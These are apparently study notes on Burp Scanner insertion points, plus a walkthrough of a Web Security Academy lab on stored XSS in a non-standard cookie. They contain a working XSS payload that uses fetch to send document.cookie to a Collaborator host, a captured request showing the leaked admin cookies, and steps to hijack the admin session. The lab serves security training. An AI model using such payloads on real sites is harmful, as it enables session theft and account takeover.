# Scanning a specific request
Right click a request > Do active scan

![](Pasted%20image%2020261107175310.png)
# Scanning custom insertion points
Right click a highlighted selection and > Scan selected insertion point

![](Pasted%20image%2020261107175822.png)

# Scanning non-standard data structures
However, consider a parameter that looks something like this:

`user=048857-carlos`

By default, Burp Scanner will replace or append a payload at the end of the parameter.

If you want to scan only `carlos` as the insertion point, highlight it and right click > Scan selected insertion point (similar to above)

You can also use Intruder to define multiple insertion points. In the example above, you can define insertion points for `048857` and `carlos`, then right-click and select **Scan defined insertion points**.

![](Pasted%20image%2020261107180334.png)

##  Lab Walkthrough: Scanning non-standard data structures

### Description
This lab contains a vulnerability that is difficult to find manually. It is located in a non-standard data structure.

To solve the lab, use Burp Scanner's **Scan selected insertion point** feature to identify the vulnerability, then manually exploit it and delete `carlos`.

You can log in to your own account with the following credentials: `wiener:peter`

### Solution

#### Step 1 - Finding XSS in the non-standard cookie
After logging in as `wiener:peter` we can see that the app performs a `GET /my-account?id=wiener` request with a custom cookie in the form of (`plaintext username:<sessioncookie>`)

We can select the plaintext name and > right click Scan selected insertion point

![](Pasted%20image%2020261107194339.png)

When the scan concludes, we can see that Burp Scanner has detected a Stored XSS vulnerability in the session cookie via Burp Collaborator.

![](Pasted%20image%2020261107194511.png)

The payload looks something like: 
```html
Cookie: session='%22%3e%3csvg%2fonload%3dfetch%60%2f%2frvqa6szi2baiil2lr1mr7r7x0o6f23srkh88yvojd%5c.oastify.com%60%3e%3a8CPrnqTYzGOGol61MRLXgBcbJ4sLAekN
```

URL decoded it looks like: 
```html
Cookie: session='"><svg/onload=fetch`//rvqa6szi2baiil2lr1mr7r7x0o6f23srkh88yvojd\.oastify.com`>:8CPrnqTYzGOGol61MRLXgBcbJ4sLAekN
```

#### Step 2 - Adapting the payload to steal admin session

The part we are interested in is before the session cookie portion delimited by a colon `:` as this is the stored XSS payload we can manipulate.

We can generate a new Burp Collaborator link to use for our payload and attempt to steal the `document.cookie` for the victim's session cookie.

 Our newly generated payload will look like: 
 ```html
Cookie: session='"><svg/onload=fetch(`//wggohvmqwdujs40d1f7j5zokvb12p5du.oastify.com/?c=${document.cookie}`)>:8CPrnqTYzGOGol61MRLXgBcbJ4sLAekN
 ```

URL-encoded looks like: 
```html
Cookie: session='%22%3e%3csvg%2fonload%3dfetch(%60%2f%2fwggohvmqwdujs40d1f7j5zokvb12p5du.oastify.com%2f%3fc%3d%24%7bdocument.cookie%7d%60)%3e%3A8CPrnqTYzGOGol61MRLXgBcbJ4sLAekN
```

We send the request and wait one minute for the victim to trigger the stored XSS: 

![](Pasted%20image%2020261108001252.png)

Checking Burp Collaborator, we get a request that leaks the session cookie of `administrator`

```http
GET /?c=session=administrator%3aGJtRj9fE5awHAXuhuMe2dWD33JR8WsAv;%20secret=gikkDBxbigJ5Ly0lXqXeVSXuiMlSeDMJ;%20session=administrator%3aGJtRj9fE5awHAXuhuMe2dWD33JR8WsAv HTTP/1.1
Host: wggohvmqwdujs40d1f7j5zokvb12p5du.oastify.com
Connection: keep-alive
sec-ch-ua-platform: "Linux"
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"
sec-ch-ua-mobile: ?0
Accept: */*
Origin: https://0a0a0078046c8a7f80c2626400450068.web-security-academy.net
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0a0078046c8a7f80c2626400450068.web-security-academy.net/
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
```
#### Step 3 - Hijacking admin session to complete the lab
We can use the Cookie Editor extension to set our session cookie as the administrator's. 

![](Pasted%20image%2020261108001727.png)

Make a new cookie called `secret` and set it to the value that was leaked

![](Pasted%20image%2020261108001806.png)

Navigate to the `/my-account?id=administrator` page to see the admin panel button leading to the `/admin` page and delete user `carlos` to finish the lab!

![](Pasted%20image%2020261108001942.png)

![](Pasted%20image%2020261108002000.png)

![](Pasted%20image%2020261108002128.png)